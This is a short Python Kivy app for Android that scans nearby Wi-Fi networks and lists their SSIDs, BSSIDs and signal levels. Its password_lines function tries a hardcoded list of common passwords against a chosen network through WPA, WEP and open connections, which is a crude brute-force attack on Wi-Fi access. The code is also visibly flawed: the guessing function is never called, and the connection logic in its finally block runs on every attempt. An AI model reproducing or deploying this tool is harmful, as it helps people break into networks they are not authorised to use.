
from kivy.app import App
from kivy.properties import StringProperty
from kivy.uix.floatlayout import FloatLayout

try:
    from wifidroid.wifi import WifiManager
except:
    pass
from kivy.uix.textinput import TextInput
import kivymd, kivy

try:
    import wifidroid
except:
    pass
from kivy.uix.label import Label
from kivy.uix.button import Button

text = ''

try:
    wifi = WifiManager()
    wifi.startScan()
    wifi.EnabledWifi(True)
    for i in range(wifi.ScanResults.size()):
        ssid = [wifi.ScanResults.get(i).SSID]
        bssid = [wifi.ScanResults.get(i).BSSID]
        levell = [wifi.ScanResults.get(i).level]
        text += ssid[0] + " " + bssid[0] + " " + str(levell[0])
except:
    pass

global progress_b

class Layout_For_App(FloatLayout):
    output = StringProperty()
    input = StringProperty()

    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.ids.label_output.text = text
        global input_val
        input_val = self.ids.input_value.text
        global progress_b
        progress_b = self.ids.pro_bar.value

    pass

def password_lines():
    passwords = [
        '12345678',
        '123456789',
        '1234567890',
        '012345678',
        '0123456789',
        '01234567890',
        '12345678910',
        '1012345678910',
        'qwerty123',
        'password',
        'wezuveqica'
    ]
    global progress_b
    for password in passwords:
        try:
            wifi.ConnectWifiWpa(input_val, password)
            progress_b += 10
        except:
            wifi.ConnectWifiWep(input_val, password)
            progress_b += 10
        finally:
            wifi.ConnectWifiPublic(input_val)
            progress_b = 100


class AndrdWifiApp(App):
    def build(self):
        return Layout_For_App()


AndrdWifiApp().run()
